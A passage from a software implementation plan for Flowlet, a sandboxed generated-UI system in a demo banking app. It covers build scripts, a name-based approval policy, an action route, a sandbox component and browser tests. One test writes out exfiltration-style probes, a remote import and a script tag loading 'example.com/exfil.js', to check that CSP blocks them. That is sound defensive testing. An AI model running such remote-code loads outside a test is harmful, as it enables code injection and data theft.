window.__createRoot = createRoot;
window.__FLOWLET_HOST__ = prewiredImpls as Record<string, unknown>;
```

(Check `packages/flowlet-components/src/impls.ts` for the actual export name — the demo imports `prewiredImpls` from the package root, so it exists; import it from the source path that works under Vite.)

- [ ] **Step 2: Create the Vite config**

`packages/flowlet-components/vite.sandbox.config.ts` (modeled on the stage's `vite.bundle-ext.config.ts` — read that file and mirror its `rollupOptions.external` handling):

```ts
import { defineConfig } from "vite";
import { fileURLToPath } from "node:url";

const pkgDir = fileURLToPath(new URL(".", import.meta.url));

/** Builds the sandbox host bundle: ESM, React EXTERNALIZED so the stage's
 *  import map supplies the shared shim instance. */
export default defineConfig({
  root: pkgDir,
  define: { "process.env.NODE_ENV": '"production"' },
  build: {
    lib: {
      entry: "bundle/entry.ts",
      formats: ["es"],
      fileName: () => "flowlet-components-sandbox.js",
    },
    rollupOptions: {
      external: ["react", "react-dom", "react-dom/client", "react/jsx-runtime"],
    },
    outDir: "dist-sandbox",
    emptyOutDir: true,
  },
});
```

Add to `packages/flowlet-components/package.json` scripts: `"build:sandbox": "vite build -c vite.sandbox.config.ts"` and add `"vite"` to devDependencies matching the version the stage package uses (check `packages/flowlet-stage/package.json`).

- [ ] **Step 3: Build and inspect**

Run: `pnpm install && pnpm --filter @flowlet/components build:sandbox`
Expected: `packages/flowlet-components/dist-sandbox/flowlet-components-sandbox.js` exists; grep it: `grep -c "window.__FLOWLET_HOST__" dist-sandbox/flowlet-components-sandbox.js` ≥ 1, and `grep -c 'from"react"' …` ≥ 1 (React stayed external).

Note: `@openuidev/react-ui` + `lucide-react` get inlined — the bundle will be large (hundreds of KB). Acceptable for the demo; note the size in the task's commit message.

- [ ] **Step 4: Demo copy script**

`apps/demo-bank/scripts/copy-flowlet-sandbox.mjs`:

```js
/** Copies the sandbox host bundle + React shim into public/ so the client can
 *  fetch them as text and hand them to FlowletStage (bundleSource/reactSource). */
import { copyFileSync, mkdirSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";

const here = dirname(fileURLToPath(import.meta.url));
const root = resolve(here, "../../..");
const outDir = resolve(here, "../public/flowlet");
mkdirSync(outDir, { recursive: true });

copyFileSync(
  resolve(root, "packages/flowlet-components/dist-sandbox/flowlet-components-sandbox.js"),
  resolve(outDir, "components-sandbox.js"),
);
copyFileSync(
  resolve(root, "packages/flowlet-stage/tests/browser/public/flowlet-react-runtime.js"),
  resolve(outDir, "react-runtime.js"),
);
console.log("[flowlet] sandbox assets copied to public/flowlet/");
```

The react shim artifact is produced by `pnpm --filter @flowlet/stage build:react-shim` (already exists, output `tests/browser/public/flowlet-react-runtime.js`).

Add to `apps/demo-bank/package.json` scripts:

```json
"predev": "node scripts/copy-flowlet-sandbox.mjs",
"prebuild": "node scripts/copy-flowlet-sandbox.mjs"
```

Also add `public/flowlet/` to `apps/demo-bank/.gitignore` (build artifacts, not source).

- [ ] **Step 5: Verify the pipeline**

Run: `pnpm --filter @flowlet/stage build:react-shim && pnpm --filter @flowlet/components build:sandbox && node apps/demo-bank/scripts/copy-flowlet-sandbox.mjs`
Expected: both files exist under `apps/demo-bank/public/flowlet/`.

- [ ] **Step 6: Commit**

```bash
git add packages/flowlet-components apps/demo-bank/scripts apps/demo-bank/package.json apps/demo-bank/.gitignore pnpm-lock.yaml
git commit -m "feat(components,demo): sandbox host bundle + asset copy pipeline"
```

---

### Task 8: Real demo policy + stage action host

**Files:**
- Create: `apps/demo-bank/src/flowlet/policy.ts` + `policy.test.ts`
- Create: `apps/demo-bank/src/flowlet/action-handler.ts` + `action-handler.test.ts`
- Create: `apps/demo-bank/src/app/api/flowlet/action/route.ts`
- Modify: `apps/demo-bank/src/flowlet/agent.ts` (replace `allowAllPolicy`)

- [ ] **Step 1: Write the failing policy tests**

`apps/demo-bank/src/flowlet/policy.test.ts`:

```ts
import { describe, it, expect } from "vitest";
import { demoPolicy } from "./policy";
import type { PolicyContext } from "@flowlet/agent";

const ctx = (toolName: string): PolicyContext => ({
  toolName,
  input: {},
  descriptor: { name: toolName, source: "caller", annotations: {}, hasExecute: true, kind: "function" },
  principal: { userId: "demo" },
});

describe("demoPolicy", () => {
  it("allows the render tools and demo read/rule tools", async () => {
    for (const name of ["render_ui", "render_view", "get_transactions", "set_rule"]) {
      expect(await demoPolicy.evaluate(ctx(name))).toBe("allow");
    }
  });
  it("allows read-shaped Composio tools", async () => {
    expect(await demoPolicy.evaluate(ctx("GMAIL_FETCH_EMAILS"))).toBe("allow");
    expect(await demoPolicy.evaluate(ctx("SLACK_LIST_CHANNELS"))).toBe("allow");
  });
  it("requires approval for write-shaped external tools", async () => {
    expect(await demoPolicy.evaluate(ctx("GMAIL_SEND_EMAIL"))).toBe("approve");
    expect(await demoPolicy.evaluate(ctx("SLACK_SEND_MESSAGE"))).toBe("approve");
  });
  it("requires approval for unknown tools (fail-safe)", async () => {
    expect(await demoPolicy.evaluate(ctx("SOME_NEW_TOOL"))).toBe("approve");
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pnpm --filter demo-bank test -- policy`
Expected: FAIL — module not found.

- [ ] **Step 3: Implement the policy**

`apps/demo-bank/src/flowlet/policy.ts`:

```ts
/**
 * The Maple demo's REAL guardrail policy (replaces the old allow-all).
 *
 * Layered on the @flowlet/agent policy machinery: one deterministic name-based
 * layer. Render + in-process demo tools and read-shaped external tools run
 * freely; anything write-shaped or unknown requires approval. Beat 3's Slack
 * post is unaffected: the poller posts server-side under the user's standing
 * natural-language rule, not through an agent tool call.
 */
import { composePolicy, type ApprovalPolicy } from "@flowlet/agent";

/** In-process tools that are safe by construction. */
const ALWAYS_ALLOW = new Set(["render_ui", "render_view", "get_transactions", "set_rule"]);

/** Read-shaped external (Composio) tool names. */
const READ_SHAPED = /(FETCH|GET|LIST|SEARCH|FIND|READ)/;

const namePolicy: ApprovalPolicy = {
  evaluate({ toolName }) {
    if (ALWAYS_ALLOW.has(toolName)) return "allow";
    if (READ_SHAPED.test(toolName)) return "allow";
    return "approve"; // fail-safe: gate writes and the unknown
  },
};

export const demoPolicy = composePolicy(namePolicy);
```

Run: `pnpm --filter demo-bank test -- policy` → PASS.

- [ ] **Step 4: Write the failing action-handler tests**

`apps/demo-bank/src/flowlet/action-handler.test.ts`:

```ts
import { describe, it, expect } from "vitest";
import { handleStageAction } from "./action-handler";

const post = (body: unknown) =>
  new Request("http://localhost/api/flowlet/action", {
    method: "POST",
    headers: { "content-type": "application/json", host: "localhost" },
    body: JSON.stringify(body),
  });

describe("handleStageAction", () => {
  it("executes an allowed action and returns its result", async () => {
    const res = await handleStageAction(post({ action: "get_transactions", payload: {} }));
    expect(res.status).toBe(200);
    const json = await res.json();
    expect(json.decision).toBe("allow");
    expect(Array.isArray(json.result)).toBe(true);
  });

  it("returns needsApproval (and does NOT execute) for approve-decided actions", async () => {
    const res = await handleStageAction(post({ action: "SLACK_SEND_MESSAGE", payload: {} }));
    const json = await res.json();
    expect(json.needsApproval).toBe(true);
    expect(json.result).toBeUndefined();
  });

  it("rejects unknown action names with 404", async () => {
    const res = await handleStageAction(post({ action: "definitely_not_a_tool", payload: {}, approved: true }));
    expect(res.status).toBe(404);
  });

  it("rejects malformed bodies with 400", async () => {
    const res = await handleStageAction(post({ nope: true }));
    expect(res.status).toBe(400);
  });
});
```

Run: `pnpm --filter demo-bank test -- action-handler` → FAIL (module not found).

- [ ] **Step 5: Implement the action host**

`apps/demo-bank/src/flowlet/action-handler.ts`:

```ts
/**
 * The stage action host — the missing bridge between sandbox dispatches and
 * the guardrail policy (spec §7). A generated component's flowlet.dispatch
 * lands here (via POST /api/flowlet/action): the SAME demoPolicy that governs
 * agent tool calls decides allow/approve/deny, and allowed actions execute
 * against the SAME in-process demo tools the agent uses.
 *
 * Approval flow (demo-grade): an `approve` decision returns { needsApproval }
 * without executing; the client shows a prompt and re-POSTs with approved:true.
 * The re-POST is trusted — acceptable for the local-only demo (the route is
 * behind the same local-host restriction as chat), noted as a known limitation.
 */
import { demoTools } from "./tools";
import { demoPolicy } from "./policy";
import { DEMO_PRINCIPAL } from "./principal";
import { buildDescriptor } from "@flowlet/agent";

interface ActionBody {
  action?: string;
  payload?: unknown;
  approved?: boolean;
}

export async function handleStageAction(req: Request): Promise<Response> {
  const body = (await req.json().catch(() => ({}))) as ActionBody;
  if (typeof body.action !== "string" || body.action.length === 0) {
    return Response.json({ error: "action (string) is required" }, { status: 400 });
  }

  const tools = demoTools() as Record<string, { execute?: (input: unknown, opts: unknown) => Promise<unknown> }>;
  const tool = tools[body.action];

  const decision = await demoPolicy.evaluate({
    toolName: body.action,
    input: body.payload,
    descriptor: buildDescriptor(body.action, tool, "caller"),
    principal: DEMO_PRINCIPAL,
  });

  if (decision === "deny") {
    return Response.json({ decision, error: "denied by policy" }, { status: 403 });
  }
  if (decision === "approve" && body.approved !== true) {
    return Response.json({ decision, needsApproval: true });
  }
  if (!tool?.execute) {
    return Response.json({ error: `unknown action "${body.action}"` }, { status: 404 });
  }
  const result = await tool.execute(body.payload ?? {}, { toolCallId: "stage-action", messages: [] });
  return Response.json({ decision, result });
}
```

(Check `buildDescriptor`'s export from `@flowlet/agent` — it's in `descriptor.ts`; add it to the package's index exports if not already there.)

`apps/demo-bank/src/app/api/flowlet/action/route.ts` (mirror the chat route's local-only guard by reusing `handleChat`'s pattern — import and apply the same `principalAllowed`-style restriction; extract `principalAllowed` from `chat-handler.ts` into an export if needed):

```ts
import { handleStageAction } from "@/flowlet/action-handler";

export async function POST(req: Request): Promise<Response> {
  return handleStageAction(req);
}
```

- [ ] **Step 6: Replace allow-all in the agent factory**

`apps/demo-bank/src/flowlet/agent.ts` — delete the `allowAllPolicy` const (lines ~29-36) and its usage; add `import { demoPolicy } from "./policy";` and pass `policy: demoPolicy` in `createFlowletAgent`.

- [ ] **Step 7: Run the full demo test suite**

Run: `pnpm --filter demo-bank test`
Expected: PASS. **Watch for**: existing `agent.test.ts` / `chat-handler.test.ts` assertions that relied on allow-all (e.g. a mocked write tool executing without approval). If a test fails because a tool now needs approval, that is the policy working — update the test's expectation (and confirm the tool in question SHOULD be gated per the policy table above), don't weaken the policy.

- [ ] **Step 8: Commit**

```bash
git add apps/demo-bank/src packages/flowlet-agent/src/index.ts
git commit -m "feat(demo): real guardrail policy + stage action host (replaces allow-all)"
```

---

### Task 9: Demo sandbox provisioning — `SandboxStage` + render-node + system prompt

**Files:**
- Create: `apps/demo-bank/src/components/flowlet/SandboxStage.tsx`
- Modify: `apps/demo-bank/src/components/flowlet/render-node.tsx:107-112`
- Modify: `apps/demo-bank/src/flowlet/agent.ts` (prompt section)

- [ ] **Step 1: Create `SandboxStage`**

`apps/demo-bank/src/components/flowlet/SandboxStage.tsx`:

```tsx
"use client";

/**
 * Provisions the tight sandbox for generated nodes: fetches the React shim +
 * components host bundle (copied into public/flowlet/ at build time), wires
 * onAction to the policy-governed action route, and renders an inline approval
 * prompt when the policy answers "approve".
 */
import { useEffect, useRef, useState, type ReactNode } from "react";
import type { UINode, ActionRequest, ActionResult } from "@flowlet/core";
import { FlowletStage } from "@flowlet/react";
import { prewiredComponents } from "@flowlet/components/descriptors";

interface Sources { react: string; bundle: string }
let sourcesPromise: Promise<Sources> | null = null;
function loadSources(): Promise<Sources> {
  // Module-level memo: fetch once per page, shared by every stage instance.
  if (!sourcesPromise) {
    sourcesPromise = Promise.all([
      fetch("/flowlet/react-runtime.js").then((r) => { if (!r.ok) throw new Error("react shim missing"); return r.text(); }),
      fetch("/flowlet/components-sandbox.js").then((r) => { if (!r.ok) throw new Error("components bundle missing"); return r.text(); }),
    ]).then(([react, bundle]) => ({ react, bundle }));
    sourcesPromise.catch(() => { sourcesPromise = null; }); // allow retry on failure
  }
  return sourcesPromise;
}

interface PendingApproval {
  req: ActionRequest;
  settle: (approved: boolean) => void;
}

async function callAction(action: string, payload: unknown, approved: boolean): Promise<ActionResult> {
  const res = await fetch("/api/flowlet/action", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ action, payload, approved }),
  });
  const json = await res.json();
  if (!res.ok) throw new Error(json.error ?? `action failed (${res.status})`);
  return { result: json.result };
}

export function SandboxStage({ node }: { node: UINode }): ReactNode {
  const [sources, setSources] = useState<Sources | null>(null);
  const [loadError, setLoadError] = useState<string | null>(null);
  const [pending, setPending] = useState<PendingApproval | null>(null);
  const mounted = useRef(true);
  useEffect(() => () => { mounted.current = false; }, []);

  useEffect(() => {
    loadSources().then(
      (s) => { if (mounted.current) setSources(s); },
      (e) => { if (mounted.current) setLoadError(String(e.message ?? e)); },
    );
  }, []);

  if (loadError) return <div data-testid="stage-load-error">Sandbox unavailable: {loadError}</div>;
  if (!sources) return <div data-testid="stage-loading" aria-busy="true" />;

  const onAction = async (req: ActionRequest): Promise<ActionResult> => {
    // First pass: let the policy decide.
    const res = await fetch("/api/flowlet/action", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ action: req.action, payload: req.payload }),
    });
    const json = await res.json();
    if (!res.ok) throw new Error(json.error ?? `action failed (${res.status})`);
    if (json.needsApproval !== true) return { result: json.result };
    // Approval required: park the dispatch promise on the user's click.
    const approved = await new Promise<boolean>((settle) => setPending({ req, settle }));
    setPending(null);
    if (!approved) throw new Error("action declined");
    return callAction(req.action, req.payload, true);
  };

  return (
    <div>
      <FlowletStage
        node={node}
        components={prewiredComponents}
        reactSource={sources.react}
        bundleSource={sources.bundle}
        onAction={onAction}
      />
      {pending && (
        <div role="alertdialog" aria-label="Approve action" data-testid="stage-approval"
          style={{ display: "flex", gap: 8, alignItems: "center", padding: "8px 12px",
            border: "1px solid #e6c200", borderRadius: 8, marginTop: 8, fontSize: 13 }}>
          <span style={{ flex: 1 }}>
            Allow <strong>{pending.req.action}</strong>?
          </span>
          <button type="button" onClick={() => pending.settle(true)}>Allow</button>
          <button type="button" onClick={() => pending.settle(false)}>Deny</button>
        </div>
      )}
    </div>
  );
}
```

- [ ] **Step 2: Route generated nodes through it**

`apps/demo-bank/src/components/flowlet/render-node.tsx` — replace the final generated-node branch (lines ~107-112):

```tsx
  return (
    <Reveal>
      <SandboxStage node={node} />
    </Reveal>
  );
```

and add `import { SandboxStage } from "./SandboxStage";` (the now-unused `FlowletStage`/`prewiredComponents` imports move into SandboxStage — remove them here if nothing else uses them).

- [ ] **Step 3: Add the render_view prompt section**

In `apps/demo-bank/src/flowlet/agent.ts` `buildInstructions()`, insert before the "RUNNABLE APPS" section:

```ts
    "",
    "COMPOSED VIEWS (render_view) — when a request needs a real layout (side-by-side",
    "panels, a dashboard, mixed components), or a novel visual element the components",
    "above can't express, call render_view with ONE GeneratedPayload:",
    "- formatVersion 'flowlet-genui/v1'; nodes is a FLAT array; children reference ids.",
    "- Layout primitives (source:'prewired'): Stack, Row, Grid, Text, Skeleton.",
    "- Catalog components (source:'prewired'): the same names listed above.",
    "- Novel components: define them in `components` as { PascalCaseName: code } and",
    "  reference with source:'generated'. Code is plain-JS ESM, NO JSX:",
    "  import React from 'react'; export default function Name(props){ return React.createElement(...); }",
    "  Novel components run in a network-jailed sandbox: fetch/XHR will fail — do not use them.",
    "  To perform an app action, call props.flowlet.dispatch({ action: 'set_rule', payload: {...} }).",
    "- Bind props to shared data with { $path: '/json/pointer' } against the payload `data`.",
    "- Caps: <=16 novel components, 64KB each. Prefer catalog components; generate only what's missing.",
    "Use render_ui for a single simple component; render_view for anything composed.",
```

- [ ] **Step 4: Verify compile + tests**

Run: `pnpm --filter demo-bank test && pnpm build`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add apps/demo-bank/src
git commit -m "feat(demo): provision the tight sandbox (SandboxStage) + render_view prompt"
```

---

### Task 10: Browser gates — generated code evaluates, meshes, dispatches; egress stays shut

**Files:**
- Modify: `packages/flowlet-stage/tests/browser/fixtures/host.ts`
- Create: `packages/flowlet-stage/tests/browser/gate-generated-code.spec.ts`
- Create: `packages/flowlet-stage/tests/browser/gate-egress-import.spec.ts`

- [ ] **Step 1: Add fixture cases**

In `fixtures/host.ts`, extend the `gen(...)` helper to forward generated code, and add three cases after `gen-delta`. First change `gen` to accept and pass the map:

```ts
  async function gen(payload: GeneratedPayload, opts?: { ext?: boolean }): Promise<StageInitPayload> {
    const result = createGenUISession(payload);
    if (!result.ok) {
      throw new Error(`createGenUISession failed: ${result.error.code}: ${result.error.message}`);
    }
    const session = result.session;
    (window as any).__session = session;
    (window as any).__patchData = (path: string, value: unknown) => {
      session.applyDataPatch(path, value).forEach((r) => controller.update({ replace: r }));
    };
    return {
      theme,
      state: {},
      // ext: the externalized bundle (React from the import-map shim) — required
      // for cases whose generated code does `import React from "react"`. The
      // self-contained bundle would ship a SECOND React and fight the shim.
      bundleSource: opts?.ext ? await bundleExt() : await bundle(),
      tree: session.tree,
      generatedComponents: payload.components,
    };
  }
```

Then add the cases (note both call `gen(payload, { ext: true })`):

```ts
  if (kind === "gen-code") {
    // A NOVEL generated component meshed with a prewired Text and a host Card
    // in one tree — the Tier 2.5 capability gate. The component also receives
    // a data-bound prop and dispatches through its per-node flowlet closure.
    return gen({
      formatVersion: VERSION,
      root: "root",
      nodes: [
        { id: "root", component: "Stack", source: "prewired", children: ["t1", "g1", "c1"] },
        { id: "t1", component: "Text", source: "prewired", props: { text: "prewired sibling" } },
        { id: "g1", component: "Gauge", source: "generated", props: { value: { $path: "/gauge/value" } } },
        { id: "c1", component: "Card", source: "host", props: { title: "Host sibling", body: "meshed" } },
      ],
      data: { gauge: { value: 42 } },
      components: {
        Gauge: [
          "import React from 'react';",
          "export default function Gauge(props) {",
          "  return React.createElement('div', { 'data-generated-impl': 'Gauge' },",
          "    React.createElement('span', { 'data-gauge-value': true }, String(props.value)),",
          "    React.createElement('button', {",
          "      onClick: function() { props.flowlet.dispatch({ action: 'gauge_reset', payload: { to: 0 } }); }",
          "    }, 'Reset'));",
          "}",
        ].join("\n"),
      },
    }, { ext: true });
  }

  if (kind === "gen-code-error") {
    // One broken module (syntax error) + one good one: per-name containment.
    return gen({
      formatVersion: VERSION,
      root: "root",
      nodes: [
        { id: "root", component: "Stack", source: "prewired", children: ["bad", "good"] },
        { id: "bad", component: "Broken", source: "generated" },
        { id: "good", component: "Fine", source: "generated" },
      ],
      components: {
        Broken: "this is not (valid javascript",
        Fine: "import React from 'react'; export default function Fine(){ return React.createElement('div', { 'data-generated-impl': 'Fine' }, 'fine'); }",
      },
    }, { ext: true });
  }
```

Note the `shared-react` reactSource condition (line ~34-37) must also cover the new cases — generated code does `import React from "react"`, which needs the import map. Change it to:

```ts
const NEEDS_REACT_SHIM = new Set(["shared-react", "gen-code", "gen-code-error"]);
const reactSource = NEEDS_REACT_SHIM.has(caseParam)
  ? await fetch("/flowlet-react-runtime.js").then((r) => r.text())
  : undefined;
```

(The `{ ext: true }` pairing with the react shim mirrors the existing `shared-react` case: externalized bundle + import-map React. The self-contained `host-bundle.js` would ship a second React and fight the shim.)

- [ ] **Step 2: Write the gate specs**

`gate-generated-code.spec.ts`:

```ts
import { test, expect } from "@playwright/test";

test("gate gen-code: a novel generated component evaluates, meshes with prewired + host siblings, binds data, and dispatches", async ({ page }) => {
  await page.goto("/fixtures/host.html?case=gen-code");
  const frame = page.frameLocator("#flowlet-stage");

  // All three sources mesh in one tree.
  await expect(frame.getByText("prewired sibling")).toBeVisible();
  await expect(frame.locator('[data-generated-impl="Gauge"]')).toBeVisible();
  await expect(frame.getByRole("heading", { name: "Host sibling" })).toBeVisible();

  // $path data binding reached the generated component.
  await expect(frame.locator("[data-gauge-value]")).toHaveText("42");

  // Its flowlet.dispatch round-trips to the host onAction with the runtime-fixed origin.
  await frame.getByRole("button", { name: "Reset" }).click();
  await expect(page.locator("#action-log")).toHaveText("origin=g1 action=gauge_reset result=ok");
});

test("gate gen-code-error: a broken generated module is contained per-name; siblings render", async ({ page }) => {
  await page.goto("/fixtures/host.html?case=gen-code-error");
  const frame = page.frameLocator("#flowlet-stage");
  await expect(frame.locator('[data-error="generated:Broken"]')).toBeVisible();
  await expect(frame.locator('[data-generated-impl="Fine"]')).toBeVisible();
});
```

`gate-egress-import.spec.ts` (regression for the strict-dynamic fix — probe from *inside* the frame like `gate-egress.spec.ts` does):

```ts
import { test, expect } from "@playwright/test";

test("gate egress-import: remote dynamic import() and <script src> are blocked by CSP", async ({ page }) => {
  await page.goto("/fixtures/host.html?case=gen-code");
  await expect(page.locator("#stage-status")).toHaveText("ready", { timeout: 10_000 });

  const frameHandle = await page.$("#flowlet-stage");
  const frame = await frameHandle!.contentFrame();

  // Remote dynamic import — the strict-dynamic hole this plan closes.
  const importResult = await frame!.evaluate(async () => {
    try { await import("https://example.com/exfil.js"); return "allowed"; }
    catch { return "blocked"; }
  });
  expect(importResult).toBe("blocked");

  // Dynamic <script src> insertion.
  const scriptResult = await frame!.evaluate(() => new Promise<string>((res) => {
    const s = document.createElement("script");
    s.onload = () => res("allowed");
    s.onerror = () => res("blocked");
    s.src = "https://example.com/exfil.js";
    document.head.appendChild(s);
    setTimeout(() => res("blocked"), 3000);
  }));
  expect(scriptResult).toBe("blocked");

  // Blob import must STILL work (that's how everything legitimate loads) —
  // proven implicitly by the gen-code case having rendered at all.
});
```

- [ ] **Step 3: Run the browser suite**

Run: `pnpm --filter @flowlet/stage build && pnpm --filter @flowlet/stage build:all-bundles && pnpm --filter @flowlet/stage test:browser`
Expected: ALL gates PASS, including the two new specs and every pre-existing one.

- [ ] **Step 4: Commit**

```bash
git add packages/flowlet-stage/tests
git commit -m "test(stage): browser gates for generated components + import/script egress"
```

---

### Task 11: Docs sync, full verification, and visual check

**Files:**
- Modify: `README.md` (layout section: mention render_view / Tier 2.5)
- Modify: `apps/demo-bank/README.md` (policy + sandbox provisioning + action route)

- [ ] **Step 1: Update docs**

`README.md` layout block: extend the `flowlet-core` line to `tools, UI nodes, stream protocol, agent, registry, stub agent, GenUI format (+ generated components)`. `apps/demo-bank/README.md`: add a short "Flowlet sandbox + policy" section documenting: assets copied to `public/flowlet/`, the `POST /api/flowlet/action` route and its demo-grade approval re-POST (trusted client — local-only), and that `allowAllPolicy` was replaced by `demoPolicy` (name-based: renders/reads allow, writes approve). Keep both succinct.

- [ ] **Step 2: Full build + unit + browser**

Run: `pnpm build && pnpm test && pnpm --filter @flowlet/stage test:browser`
Expected: everything PASS.

- [ ] **Step 3: Visual verification (required by user rule: render + screenshot, not just unit tests)**

Run the demo: `pnpm --filter demo-bank dev`, open `http://localhost:3000`, and in the Flowlet chat ask something the catalog can't express as one component, e.g. **"show me a spending dashboard with a gauge of my late-night total next to the transactions table"**. Verify with a screenshot (browser tools or Playwright):
1. A composed view renders inside ONE sandboxed iframe (inspect: `#flowlet-stage`).
2. It contains a novel component AND catalog components side by side.
3. DevTools network tab: no requests originate from the stage iframe.
4. Trigger an approval: ask "email me this summary" (a `GMAIL_SEND_*` tool) and confirm the ApprovalCard appears in-chat before anything sends.

If the model output is flaky on the first prompt, retry or tighten the prompt — what's being verified is the pipeline, not the model's taste.

- [ ] **Step 4: Commit**

```bash
git add README.md apps/demo-bank/README.md
git commit -m "docs: Tier 2.5 — render_view, sandbox provisioning, demo policy"
```

---

## Explicitly deferred (documented in spec §11 — do NOT build here)

1. Retiring/jailing the loose `HtmlApp` iframe (Tier 2).
2. CPU watchdog for runaway generated code.
3. JSX transpile convenience.
4. Server-verified approval tokens for the action route (demo trusts the re-POST; the route is local-only).
